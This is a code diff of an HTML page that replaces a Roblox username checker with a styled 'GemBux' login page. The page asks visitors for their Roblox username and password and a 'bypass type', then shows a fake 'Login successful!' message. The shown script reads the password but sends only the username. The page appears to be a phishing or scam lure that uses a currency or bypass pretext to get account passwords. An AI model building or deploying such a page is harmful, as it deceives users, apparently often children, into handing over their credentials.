@@ -1,35 +1,192 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <!-- Sup NTTS -->
   <meta charset="UTF-8">
-  <title>Username Checker</title>
+  <title>GemBux</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">  
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Source Code Pro', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: linear-gradient(135deg, #7f2ba3, #442867);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .login-box {
+      background-color: rgb(23, 23, 23);
+      backdrop-filter: blur(15px);
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+      color: white;
+      width: 300px;
+      text-align: center;
+    }
+
+    .login-box h2 {
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      transition: .5s;
+    }
+
+    .login-box input:hover {
+      filter: brightness(.9);
+      padding: 12px;
+    }
+
+    .login-box input:focus {
+      filter: brightness(.9);
+      padding: 12px;
+    }
+
+    .login-box input::placeholder {
+      color: #ddd;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 10px;
+      background: #7b2cbf;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-box button:hover {
+      background: #9d4edd;
+    }
+        .login-box input,
+    .custom-select {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      position: relative;
+      font-size: 14px;
+    }
+
+    .custom-select {
+      background-image: url('data:image/svg+xml;utf8,<svg fill="white" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+      background-repeat: no-repeat;
+      background-position: right 10px center;
+      background-size: 16px;
+      padding-right: 30px;
+    }
+
+    .custom-select option {
+      color: black;
+    }
+      .spinner {
+    border: 4px solid rgba(255, 255, 255, 0.2);
+    border-top: 4px solid white;
+    border-radius: 50%;
+    width: 30px;
+    height: 30px;
+    animation: spin 0.8s linear infinite;
+    margin: 10px auto;
+    display: none;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  #status {
+    margin-top: 10px;
+    font-size: 12px;
+  }
+  </style>
 </head>
 <body>
-  <h1>Check Roblox Username</h1>
-  <input id="username" placeholder="Enter username" />
-  <button onclick="checkUsername()">Check</button>
-  <p id="result"></p>
+  <div class="login-box" id="login-box">
+  <h2>Login</h2>
+  <form id="loginForm">
+    <input type="text" id="input1" placeholder="Username">
+    <input type="password" id="input2" placeholder="Password">
+    <select class="custom-select" id="bypassSelect">
+      <option value="" disabled selected>Select Bypass Type</option>
+      <option value="1">FGHT Bypass</option>
+      <option value="2">FPB V1 Bypass</option>
+      <option value="3">FPB V2 Bypass</option>
+    </select>
+    <button type="submit">Login</button>
+  </form>
+  <p style="font-size: 10px;">FPB may take longer than 24h to bypass<span style="color: red;">*</span></p>
+  <div id="spinner" class="spinner"></div>
+<p id="status"></p>
+</div>
 
-  <script>
-async function checkUsername() {
-  const username = document.getElementById("username").value;
-  const result = document.getElementById("result");
+<script>
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
 
-  const response = await fetch("/api/check-username", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ username })
-  });
+  const username = document.getElementById('input1').value;
+  const password = document.getElementById('input2').value;
+  const bypass = document.getElementById('bypassSelect').value;
 
-  const data = await response.json();
+  const spinner = document.getElementById('spinner');
+  const loginbox = document.getElementById('login-box');
+  const status = document.getElementById('status');
 
-  if (data.exists) {
-    result.textContent = "❌ Username is taken.";
-  } else {
-    result.textContent = "✅ Username is available.";
+  status.textContent = '';
+  spinner.style.display = 'block';
+
+  if (!username || !password || !bypass) {
+    spinner.style.display = 'none';
+    status.textContent = '⚠️ All fields are required.';
+    return;
   }
-}
 
-  </script>
+  try {
+    const response = await fetch('/api/check-username', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username })
+    });
+
+    const data = await response.json();
+
+    spinner.style.display = 'none';
+
+    if (!data.exists) {
+      status.textContent = '❌ Username not found on Roblox.';
+      return;
+    }
+    setTimeout(() => alert("Login successful!"), 500);
+
+  } catch (err) {
+    spinner.style.display = 'none';
+    status.textContent = '❌ Error checking username.';
+  }
+});
+</script>
 </body>
 </html>
